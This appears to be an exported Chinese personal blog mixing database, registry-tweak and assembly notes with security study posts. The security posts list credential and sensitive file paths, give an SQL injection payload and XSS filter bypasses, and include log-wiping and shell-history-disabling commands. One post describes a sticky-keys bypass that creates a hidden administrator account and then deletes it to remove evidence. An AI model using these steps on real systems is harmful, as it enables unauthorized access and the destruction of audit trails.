<p>经过上面的实验可以得出结论，事务B更新了一条记录，但是没有提交，此时事务A可以查询出未提交记录。造成脏读现象。未提交读是最低的隔离级别。</p>
<h3 id="read-committed"><a href="#read-committed" class="headerlink" title="read committed"></a>read committed</h3><p>先把上面为commit的事务A提交了，再修改A的隔离等级为read committed，启动，查询，但是先不提交，此时的数据依然是之前的样子<br>    set  session transaction isolation level read committed</p>
<p><img src="image-20210331153425152.png" alt="image-20210331153425152"></p>
<p>B：启动事务，修改数据，<br>    update isoluate.test1 set num=50 where id=1;</p>
<p><img src="image-20210331153536191.png" alt="image-20210331153536191"></p>
<p>可以看到事务A查询到的数据未改变。</p>
<p>提交事务B的结果</p>
<p><img src="image-20210404191226006.png" alt="image-20210404191226006"></p>
<p>这时候再看A的结果，可以看到已经改变了。</p>
<p>与之前不同的是，read committed解决了read uncommitted的可以读修改前的问题，但是还是会出现在一个事务中，同样的操作，得到了不同的结果的问题。已提交读只允许读取已提交的记录，但不要求可重复读。</p>
<p><strong>大多数数据库的默认级别就是Read committed，比如Sql Server , Oracle。</strong></p>
<h3 id="repeatable-read"><a href="#repeatable-read" class="headerlink" title="repeatable read"></a>repeatable read</h3><p>提交上一次的事务，将隔离等级设位repeatable read</p>
<p>​    set session transaction isolation level repeatable read;</p>
<p><img src="image-20210404193143519.png" alt="image-20210404193143519"></p>
<p>在事务B中修改更新数据(1)，事务A此时看不到变化(2)，事务B提交后(3)，事务A还是看不到变化(4)。</p>
<p><img src="image-20210404193835243.png" alt="image-20210404193835243"></p>
<p>事务A提交后就可以看到事务B中修改的数据了</p>
<p>然而，当我们在事务B中插入一条数据或者删除一条数据，然后提交，之后在事务A中再重复一样的操作，就会出现问题了</p>
<p><img src="image-20210404205222080.png" alt="image-20210404205222080"></p>
<p>删除也是一样，只不过不是报错，而是卡住</p>
<p><img src="image-20210404205401063.png" alt="image-20210404205401063"></p>
<p>关于幻读，找到了一个比较好的解释：<a class="link" href="https://segmentfault.com/a/1190000016566788">https://segmentfault.com/a/1190000016566788<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="幻读比较白话的解释"><a href="#幻读比较白话的解释" class="headerlink" title="幻读比较白话的解释"></a>幻读比较白话的解释</h4><p>接用那位老哥的比较白话的解释：</p>
<blockquote>
<p>幻读，并不是说两次读取获取的结果集不同，幻读侧重的方面是某一次的  select 操作得到的结果所表征的数据状态无法支撑后续的业务操作。更为具体一些：select 某记录是否存在，不存在，准备插入此记录，但执行  insert 时发现此记录已存在，无法插入，此时就发生了幻读。</p>
</blockquote>
<h4 id="幻读和不可重复的区别"><a href="#幻读和不可重复的区别" class="headerlink" title="幻读和不可重复的区别"></a>幻读和不可重复的区别</h4><p>(1) 不可重复读是读取了其他事务更改的数据，针对update操作</p>
<p>解决：使用行级锁，锁定该行，事务A多次读取操作完成后才释放该锁，这个时候才允许其他事务更改刚才的数据。</p>
<p>(2) 幻读是读取了其他事务新增的数据，针对insert和delete操作</p>
<p>解决：使用表级锁，锁定整张表，事务A多次读取数据总量之后才释放该锁，这个时候才允许其他事务新增数据。</p>
<p>具体可以看：<a class="link" href="https://cloud.tencent.com/developer/article/1450773">https://cloud.tencent.com/developer/article/1450773<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>Mysql的默认隔离级别就是Repeatable read。</strong></p>
<h3 id="serializable"><a href="#serializable" class="headerlink" title="serializable"></a>serializable</h3><p>​     set session transaction isolation level serializable;</p>
<p>serialization等级就简单多了，直接从源头上解决了了问题</p>
<p><img src="image-20210404204619480.png" alt="image-20210404204619480"></p>
<p>当要处理可能会冲突的数据时，直接就卡住不动，直到对方结束。</p>
<p>Serializable 是最高的事务隔离级别，同时代价也花费最高，性能很低，一般很少使用。在该级别下，事务顺序执行，不仅可以避免脏读、不可重复读，还避免了幻读。</p>
]]></content>
  </entry>
  <entry>
    <title>整理win10 右键菜单及资源管理器左边的部分选项</title>
    <url>/2020/07/24/%E6%95%B4%E7%90%86win10%20%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E5%8F%8A%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E5%B7%A6%E8%BE%B9%E7%9A%84%E9%83%A8%E5%88%86%E9%80%89%E9%A1%B9-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13365923.html">源地址：https://www.cnblogs.com/This-is-Y/p/13365923.html<i class="fas fa-external-link-alt"></i></a></p>
<p>大部分可以通过火绒的右键管理或者Dism++来管理右键菜单</p>
<p>少部分管理不了的，也可以通过修改注册表来进行管理，如果和我一样对注册表不熟悉的话，建议先备份。建议先备份。建议先备份</p>
<p>我只是一个搬运工</p>
<p>部分来自知乎：<a class="link" href="https://zhuanlan.zhihu.com/p/57176783">https://zhuanlan.zhihu.com/p/57176783<i class="fas fa-external-link-alt"></i></a></p>
<p>需要会的知识：</p>
<p>win+r输入regedit打开注册表</p>
<p><a class="link" href="https://blog.csdn.net/guoxilen/article/details/78240020">Win10注册表获取权限<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>固定到快速访问</strong> <br><br><br><br>打开注册表编辑器后，定位到“HKEY_CLASSES_ROOT\Folder\shell\pintohome”；<br><br><br><br>然后在右侧窗口中新建“字符串值”，然后命名为“Extended”；</p>
<img src="1503868-20200723124042583-1584035516.png" width="1000" loading="lazy">

<p> <strong>播放到设备</strong></p>
<p>打开注册表编辑器后，定位到HKEY_CLASSES_ROOT\CLSID{7AD84985-87B4-4a16-BE58-8B72A5B390F7}</p>
<p>Win10注册表获取权限</p>
<p>然后给他换个名字就好了，或者把他下一级的文件换个名字，或者两个都换</p>
<img src="1503868-20200723180219535-643106514.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p> <strong>创建新视频</strong></p>
<p> 打开注册表，定位到HKEY_CLASSES_ROOT\AppX43hnxtbyyps62jhe9sqpdzxn1790zetc\Shell\ShellCreateVideo</p>
<p> 删掉ShellCreateVideo</p>
<p> 打开注册表，定位到HKEY_CLASSES_ROOT\AppXk0g4vb8gvt7b93tg50ybcy892pge6jmt\Shell\ShellCreateVideo</p>
<p> 这里也删掉ShellCreateVideo</p>
<p> </p>
<p><strong>CRC SHA</strong><br><br>如果电脑有安装7-Zip，在对文件右键时可能会有这个选项，<br><br>打开7zip，工具-&gt;选项-&gt;7-Zip-&gt;CRC SHA,取消勾选就好了<br></p>
 <img src="1503868-20200723181649675-355175446.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> <img src="1503868-20200723181736378-207388146.png" alt loading="lazy"></p>
<p> </p>
<p> 同时在这里还有很多其他的选项，不过有些可能需要管理员权限才能启动</p>
<p> </p>
<p><strong>使用画图3D进行编辑和设置为桌面背景</strong></p>
<p>这两个在同一个目录下，所以放在一起说</p>
<p>打开注册表，定位到HKEY_LOCAL_MACHINE\SOFTWARE\Classes\SystemFileAssociations.jpg\Shell</p>
<p>这里的 3D Edit  即为 使用画图3D进行编辑</p>
<p>setdesktopwallpaper 即为设置为桌面背景</p>
<p>删除就没有了</p>
<p>注意这里的  **.jpg **是针对jpg后缀文件，如果其他后缀的文件也需要处理，修改这个地方就好了。如处理.png图片，那就定位到</p>
<p>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\SystemFileAssociations.png\Shell</p>
<p>同样还有jpe、jpeg</p>
<p> </p>
<p>** 资源管理器中的onedrive菜单**</p>
<p> 打开注册表，定位到HKEY_CLASSES_ROOT\CLSID{018D5C66-4533-4307-9B53-224DE2ED1FE6}\ShellFolder</p>
<p>修改attributes的数值为</p>
<p> <img src="1503868-20200724110234210-233005889.png" width="1000" loading="lazy"></p>
<p> 把数值改为f090004d就好了，重启电脑</p>
<p> </p>
<p><strong>我的电脑下的<strong>6个文件夹</strong>以及3D对象选项</strong></p>
<p>打开注册表，定位到\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace</p>
<p>找到{0DB7E03F-FC29-4DC6-9020-FF41B59E513A}，给他重命名或者直接删除就好了</p>
<img src="1503868-20200724112235464-1111551388.png" width="1000" loading="lazy">

<p>回到资源管理器，F5刷新，3D对象就不见了，没用的话就关闭重新打开资源管理器</p>
<p> </p>
<p>在我的电脑下的其他文件夹，也可以删除，这里可以采用执行注册表文件的方式处理</p>
<p>在桌面创建一个txt文本文件</p>
<p>写入</p>
<p>Windows Registry Editor Version 5.00<br><br>[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{f86fa3ab-70d2-4fc7-9c99-fcbf05467f3a}]            ;视频<br><br>[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{d3162b92-9365-467a-956b-92703aca08af}]           ;文档<br><br>[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}]        ;桌面<br><br>[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{3dfdf296-dbec-4fb4-81d1-6a3438bcf4de}]        ;音乐<br><br>[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{088e3905-0323-4b02-9826-5d99428e115f}]        ;下载<br><br>[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{24ad3ad4-a569-4530-98e1-ab02f9417aa8}]          ;图片<br><br>保存。退出。修改文件后缀为.reg。就像这样。然后双击运行<br><br><img src="1503868-20200726112729760-339274669.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p> 如果要恢复，同样的操作。代码如下</p>
<p>Windows Registry Editor Version 5.00<br><br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{f86fa3ab-70d2-4fc7-9c99-fcbf05467f3a}]            ;视频<br><br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{d3162b92-9365-467a-956b-92703aca08af}]        ;文档<br><br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}]        ;桌面<br><br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{3dfdf296-dbec-4fb4-81d1-6a3438bcf4de}]            ;音乐<br><br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{088e3905-0323-4b02-9826-5d99428e115f}]        ;下载<br><br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace{24ad3ad4-a569-4530-98e1-ab02f9417aa8}]        ;图片<br><br><strong>左边导航窗口的快速访问</strong></p>
<p> 打开注册表，定位到“HKEY_CLASSES_ROOT\CLSID{679f85cb-0220-4080-b29b-5540cc05aab6}\ShellFolder”；</p>
<p>修改参数Attributes（默认为a0100000）的值为a0600000</p>
<img src="1503868-20200728095416176-361564457.png" width="1000" loading="lazy">

<p>打开任务管理器，重启资源管理器</p>
<img src="1503868-20200728095448958-87746041.png" alt loading="lazy">

<p> </p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>文件包含与2getshell</title>
    <url>/2021/08/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E2getshell-This-is-Y/</url>
    <content><![CDATA[<p>文件读取getshell一般方式<br>1.找源码<br>2.找数据库</p>
<h2 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>/etc/passwd<br>/etc/my.cnf<br>/etc/shadow<br>/etc/sysconfig/network-scripts/ifcfg-eth0   ip地址<br>/etc/hosts                                  通常配置了一些内网域名</p>
<p>历史命令<br>/root/.bash_history<br>/home/username/.bash_history<br>从上述发现很多路径和密码。</p>
<p>私钥公钥<br>/root/.ssh/id_rsa<br>/root/.ssh/authorized_keys<br>一般都不会开放端口，无法利用。</p>
<p>系统版本<br>/etc/redhat-release<br>提权需求</p>
<p>非常重要的一个配置文件<br>var/lib/mlocate/mlocate.db<br>基于本地所有文件的信息的配置信息都知道。需要高权限用户才可以。</p>
<p>其余的一些<br>/proc/sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid<br>/proc/pid/cmdline   则可以看到对应pid进程的完整命令行。<br>/proc/net/fib_trie   内网IP<br>/proc/self/environ   环境变量<br>/proc/self/loginuid   当前用户</p>
<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3>]]></content>
  </entry>
  <entry>
    <title>检查文件MD5检验文件是否被修改</title>
    <url>/2020/08/18/%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6MD5%E6%A3%80%E9%AA%8C%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E8%A2%AB%E4%BF%AE%E6%94%B9-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13523493.html">源地址：https://www.cnblogs.com/This-is-Y/p/13523493.html<i class="fas fa-external-link-alt"></i></a></p>
<p>cmd下，输入certutil -hashfile 文件名 md5</p>
<p>举个例子</p>
<img src="1503868-20200818144805053-2036147690.png" alt loading="lazy">

<p> </p>
<p> 某个工具的下载页面</p>
<p>下载好后，cmd下执行</p>
<img src="1503868-20200818144927582-1324965701.png" alt loading="lazy">

<p> </p>
<p>文件正常</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>注入的原理以及防御</title>
    <url>/2021/04/04/%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1-This-is-Y/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考自：<a class="link" href="https://juejin.cn/post/6844903917654900743">https://juejin.cn/post/6844903917654900743<i class="fas fa-external-link-alt"></i></a></p>
<blockquote>
<p>  sql注入的原理是将sql代码伪装到输入参数中，传递到服务器解析并执行的一种攻击手法。也就是说，在一些对server端发起的请求参数中植入一些sql代码，server端在执行sql操作时，会拼接对应参数，同时也将一些sql注入攻击的“sql”拼接起来，导致会执行一些预期之外的操作。</p>
</blockquote>
<p>在OWASP中是这样子解释的</p>
<ul>
<li>引用描述：<br>  几乎任何数据源都能成为注入载体，包括环境变量、所有类型的用户、参数、外部和内部Web服务。当攻击者可以向解释器发送恶意数据时，注入漏洞产生。</li>
<li>安全弱点<br>  注入漏洞十分普遍，尤其是在遗留代码中。注入漏洞通常能在SQL、LDAP、XPath或是NoSQL查询语句、OS命令、XML解析器、SMTP包头、表达式语句及ORM查询语句中找到。注入漏洞很容易通过代码审查发现。扫描器和模糊测试工具可以帮助攻击者找到这些漏洞。</li>
<li>影响<br>  注入能导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或是拒绝服务。注入有时甚至能导致主机被完全接管。您的应用和数据需要受到保护，以避免对业务造成影响。</li>
</ul>
<h3 id="自己的例子"><a href="#自己的例子" class="headerlink" title="自己的例子"></a>自己的例子</h3><p>这边那我自己写的一个古老的jsp网页来说说，</p>
<p>登陆页<br><a class="link" href="http://127.0.0.1:8080/login.jsp">http://127.0.0.1:8080/login.jsp<i class="fas fa-external-link-alt"></i></a><br><img src="image-20210405102929373.png" alt="image-20210405102929373"></p>
<p><img src="image-20210405103027645.png" alt="image-20210405103027645"></p>
<p>主要功能由dologin.jsp实现。接着来看dologin.jsp的内容</p>
<p><img src="image-20210405103222272.png" alt="image-20210405103222272"></p>
<p>这边写的也是非常简单，获取到参数后直接拼接，</p>
<pre><code>&quot;select * from admin where username=&#39;&quot;+username+&quot;&#39; and password=&#39;&quot;+ password + &quot;&#39;&quot;;
</code></pre>
<p>这种处理sql语句的方式就导致了注入，<br>我数据库中的账号密码是这个</p>
<p><img src="image-20210405103701070.png" alt="image-20210405103701070"></p>
<p>如果我们正经输入账号密码是这样子的<br>    select * from admin where username=’test’ and password=’12138’;<br>这个sql语句在mysql中执行是这样子的</p>
<p><img src="image-20210405103932866.png" alt="image-20210405103932866"></p>
<p>如果我们输入了错误的账号密码，是这样子的结果<br>    select * from admin where username=’test’ and password=’9527’;</p>
<p><img src="image-20210405104023444.png" alt="image-20210405104023444"></p>
<p>在jsp中通过一个if判断就可以知道用户是否在数据库中，也就完成了登陆的账号密码验证。</p>
<p>而如果我们不正经的输入了一些奇怪的东西。比如在<br>    ‘or 1=1 #<br>sql语句就变成了<br>    select * from admin where username=’’or 1=1 #’ and password=’’;<br>而当这个sql语句直接在数据库中执行</p>
<p><img src="image-20210405105330165.png" alt="image-20210405105330165"></p>
<p>什么都没有，显示还在等待，输入一个分号就出来了结果，因为#注释掉了后面的语句，整个句子就变成了<br>    select * from admin where username=’’or 1=1 #<br>至于为什么在jsp中这样子就可以登陆成功，姑且理解为自动填充了一个分号吧。这里我也没搞明白</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="sql预编译"><a href="#sql预编译" class="headerlink" title="sql预编译"></a>sql预编译</h3><p>基本上大家都知道 采用sql语句预编译和绑定变量，是防御sql注入的最佳方法。但是其中的深层次原因就不见得都理解了。</p>
<pre><code>    String sql = &quot;select id, no from user where id=?&quot;;
    PreparedStatement ps = conn.prepareStatement(sql);
    ps.setInt(1, id);
    ps.executeQuery();
</code></pre>
<h3 id="严格的参数校验"><a href="#严格的参数校验" class="headerlink" title="严格的参数校验"></a>严格的参数校验</h3><p>拿正则或者其他的函数，过滤掉不该出现的关键字或字符</p>
<h3 id="owasp-top10中关于如何防止注入"><a href="#owasp-top10中关于如何防止注入" class="headerlink" title="owasp top10中关于如何防止注入"></a>owasp top10中关于如何防止注入</h3><p>防止注入漏洞需要将数据与命令语句、查询语句分隔开来。<br>• 最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。<br>  <strong>注意：当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。</strong><br>• 使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。<br>• 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。OWASP的Java Encoder和类似的库提供了这样的转义例程。<br>  <strong>注意：SQL结构，比如：表名、列名等无法转义，因此用户提供的结构名是非常危险的。这是编写软件中的一个常见问题。</strong><br>• 在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。</p>
]]></content>
  </entry>
  <entry>
    <title>浅谈xss的各种触发方式以及防护绕过</title>
    <url>/2020/03/07/%E6%B5%85%E8%B0%88xss%E7%9A%84%E5%90%84%E7%A7%8D%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12438723.html">源地址：https://www.cnblogs.com/This-is-Y/p/12438723.html<i class="fas fa-external-link-alt"></i></a></p>
<p>触发方式都写在里面了</p>
<img src="1503868-20200307205424570-687485412.png" alt width="1008" height="359">

<p> </p>
<p> </p>
<p>只写部分，更多触发事件可以参考这两篇文章</p>
<p><a class="link" href="https://blog.csdn.net/qq_36374896/article/details/82755793">https://blog.csdn.net/qq_36374896/article/details/82755793<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.cnblogs.com/webzhuo/p/4155594.html">https://www.cnblogs.com/webzhuo/p/4155594.html<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p>再说一下防护：</p>
<p>输入检测：</p>
<p>htmlspecialchars函数：用来把一些预定义的字符转换为HTML实体,默认不开启对单引号的过滤</p>
<p>　　绕过:用onmouseover或者onclick等方式，像xsslabs里第2,3,4题就是用onclick</p>
<p>关键字黑名单：</p>
<p>　　换一个关键字，反正上面有这么多。</p>
<p>　　用html字符实体编码，网站<a class="link" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php<i class="fas fa-external-link-alt"></i></a></p>
<p>　　或者用大小写绕过</p>
<p>　　或者使用tab制表符，空格，回车等（比如jav ascri pt:alert(1) 。这个要先在别的文本框输入tab进去（有些情况下，按下tab就跳到下一个别的地方去了），在把payload复制过来使用。</p>
<p>　　当遇到清除关键字的时候，可以尝试双写绕过，scriscriptpt，清除一个script后，剩下的拼接回来又是一个script，这个在注入里面也会用到</p>
<p> </p>
<p>同时昨天通过学长，得到一大票xsspayload，也放在这里，可以拿来爆破</p>
<p><a class="link" href="https://github.com/TheKingOfDuck/easyXssPayload">https://github.com/TheKingOfDuck/easyXssPayload<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>渗透三字经</title>
    <url>/2020/10/22/%E6%B8%97%E9%80%8F%E4%B8%89%E5%AD%97%E7%BB%8F-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13861334.html">源地址：https://www.cnblogs.com/This-is-Y/p/13861334.html<i class="fas fa-external-link-alt"></i></a></p>
<p>渗透网站娱乐版<br>进谷歌  找注入<br>没注入  就旁注<br>没旁注  用0day<br>没0day  猜目录<br>没目录  就嗅探<br>爆账户  找后台<br>传小马  放大马<br>拿权限  挂页面<br>放暗链  清数据</p>
<p><br>渗透企业实战版<br>搞企业  先扫描<br>扫描器  商业好<br>默密码  都知道<br>社工库  找一找<br>邮箱号  先列好<br>九头蛇  跑一跑<br>搞不定  放大招<br>发邮件  凭伪造<br>没邮箱  搞网站<br>二级域  皆可爆<br>老漏洞  没修好<br>新漏洞  刷一票<br>干研发  Git 找<br>源代码  全都要<br>C D N  可以跳<br>防火墙  可以撬<br>堡垒机  可以秒<br>云防护  可以秒<br>是企业  没有哪家搞不了！<br><br></p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>漏洞复现笔记</title>
    <url>/2024/04/22/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>痕迹清除</title>
    <url>/2021/04/05/%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4-This-is-Y/</url>
    <content><![CDATA[<h2 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h2><ol>
<li><p>如果是windows系统，可用MSF中的 clearev 命令清除痕迹</p>
</li>
<li><p>如果3389远程登录过，需要清除mstsc痕迹</p>
<p>regedit定位到  计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Terminal Server Client\Default，就可以看到了</p>
<p>​    这里提一下如何看别人是否连结果自己电脑</p>
<p>​    控制面板-&gt;管理工具-&gt;事件查看器</p>
<p>​    选择windows日志-&gt;安全</p>
<p>​    筛选事件id528</p>
</li>
<li><p>执行命令清除日志：</p>
</li>
</ol>
<p>del %WINDR%* .log /a/s/q/</p>
<ol start="4">
<li>如果是web应用，找到web日志文件，删除 </li>
</ol>
<p>相关文章：<a class="link" href="https://www.cnblogs.com/milantgh/p/3602191.html">WINDOWS之入侵痕迹清理总结<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h2><ol>
<li>如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令</li>
</ol>
<p>export HISTFILE=/dev/null export HISTSIZE=0</p>
<ol start="2">
<li><p>删除 /var/log 目录下的日志文件</p>
</li>
<li><p>如果是web应用，找到web日志文件，删除 </p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>瞎写的汇编笔记</title>
    <url>/2021/11/06/%E7%9E%8E%E5%86%99%E7%9A%84%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<p>按王爽的第四版《汇编语言》目录来的、<br>下载地址：<a class="link" href="http://www.j9p.com/down/527982.html">http://www.j9p.com/down/527982.html<i class="fas fa-external-link-alt"></i></a><br>课后答案：<a class="link" href="https://max.book118.com/html/2018/0304/155683552.shtm">https://max.book118.com/html/2018/0304/155683552.shtm<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h1><p>指令和数据是应用上的概念，在内存或磁盘中没有区别，都是二进制信息<br>例如，内存中的二进制信息1000100111011000， 计算机可以把它看作大小为89D8H的数据来处理，也可以将其看作指令mov ax,bx来执行。</p>
<p>比特 - bit - b<br>字节 - Byte - B == 8*b</p>
<p>CPU要想进行数据的读写，必须和外部器件(标准的说法是芯片)进行下面3类信息的交互。</p>
<ul>
<li>存储单元的地址(地址信息);</li>
<li>器件的选择，读或写的命令(控制信息);</li>
<li>读或写的数据(数据信息)。</li>
</ul>
<p>每一个CPU芯片都有许多管脚，这些管脚和总线相连。也可以说，这些管脚引出总线。一个CPU可以引出3种总线的宽度标志了这个CPU的不同方面的性能:</p>
<ul>
<li>地址总线的宽度决定了CPU的寻址能力;</li>
<li>数据总线的宽度决定了CPU与其他器件进行数据传送时的-次数据传送量;</li>
<li>控制总线的宽度决定了CPU对系统中其他器件的控制能力。</li>
</ul>
<h1 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2. 寄存器"></a>2. 寄存器</h1><p>通用寄存器<br>AX，BX，CX，DX<br>又可以细分为<br>AH,AL,  BH,BL,  CH,CL,  DH,DL<br>低八位为L，<br>高八位为H，</p>
<p><img src="image-20211106142002603.png" alt="image-20211106142002603"></p>
<p>20000的2进制为0100111000100000，低八位为00100000，高八位为01001110<br><img src="image-20211106142635332.png" alt="image-20211106142635332"></p>
<p>字节 - byte - 1Byte - 8bit<br>字 - word - 2Byte - 16bit（一个寄存器大小）</p>
<p><img src="image-20211106144039395.png" alt="image-20211106144039395"></p>
<p><img src="image-20211106144242478.png" alt="image-20211106144242478"></p>
<p>汇编指令不区分大小写</p>
<p>段寄存器</p>
<p>CS, DS, SS, ES</p>
]]></content>
  </entry>
  <entry>
    <title>破解部分windows密码（win7用粘滞键，winxp等用pe）</title>
    <url>/2020/02/07/%E7%A0%B4%E8%A7%A3%E9%83%A8%E5%88%86windows%E5%AF%86%E7%A0%81%EF%BC%88win7%E7%94%A8%E7%B2%98%E6%BB%9E%E9%94%AE%EF%BC%8Cwinxp%E7%AD%89%E7%94%A8pe%EF%BC%89-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12271610.html">源地址：https://www.cnblogs.com/This-is-Y/p/12271610.html<i class="fas fa-external-link-alt"></i></a></p>
<p>先讲思路，在锁定界面下，连续按5次shift会运行c/windows/system32/sethc.exe文件,然后通过异常关机,触发windows的修复策略,然后打开脱机文档,然后掉包sethc.exe文件为cmd.exe文件,重启电脑,触发sethc.exe,实际上是打开了cmd.exe,然后通过net命令修改账户密码</p>
<p>win7:</p>
<p>先异常关闭windows系统,再启动,在windows错误恢复界面,点击启动修复</p>
<img src="1503868-20200206232332068-1627158519.png" alt width="706" height="552">

<p> </p>
<p> </p>
<p> 等待,出现如下界面</p>
<img src="1503868-20200206232459230-1881258478.png" alt width="700" height="527">

<p> </p>
<p> </p>
<p> 点击详细信息,拉到最下面,点开脱机阅读隐私声明</p>
<img src="1503868-20200206232606786-1417310284.png" alt width="694" height="521">

<p> </p>
<p> </p>
<p> 然后就会打开一个文件,用记事本打开.点击右上角的打开文件,</p>
<img src="1503868-20200206232843688-1636109825.png" alt width="688" height="519">

<p> </p>
<p> </p>
<p> 在这里,完成掉包工作,,(注意修改下面的文件类型,不然看不到exe文件)</p>
<img src="1503868-20200206233221211-1933566241.png" alt>

<p> </p>
<p> 掉包完成后(建议复制一份cmd.exe文件),重启电脑,连按5次shift,然后就可以打开cmd.exe文件了</p>
<img src="1503868-20200206233330468-1032146929.png" alt>

<p> </p>
<p> <img src="1503868-20200206233500014-754603426.png" alt width="542" height="374"></p>
<p> </p>
<p> 关于net命令的用法,详细在这里可以看到:<a class="link" href="https://www.cnblogs.com/lonelyxmas/p/9343815.html">https://www.cnblogs.com/lonelyxmas/p/9343815.html<i class="fas fa-external-link-alt"></i></a></p>
<p>这里我简单说一下要用到的:</p>
<p>net user 当前账户名 “” 让当前账户密码为空,(在本该填写密码的位置填写 两个双引号 设空)</p>
<p>net user 新建账户名 新建账户密码 /add  新建一个属于自己的账户(此时权限不足,需要提权)</p>
<p>net localgroup administrators 你的新建的账户名 /add  使新建的账户达到administrators权限</p>
<p>net user 新建的账户名 /del 注销后,再运行一次这样操作,再cmd里面用这条命令删除账户,消除证据</p>
<p> </p>
<p>winxp：</p>
<p>　　思路，从bios系统修改电脑启动顺序，让u盘启动优先级高于硬盘，之后插入制作好的pe盘</p>
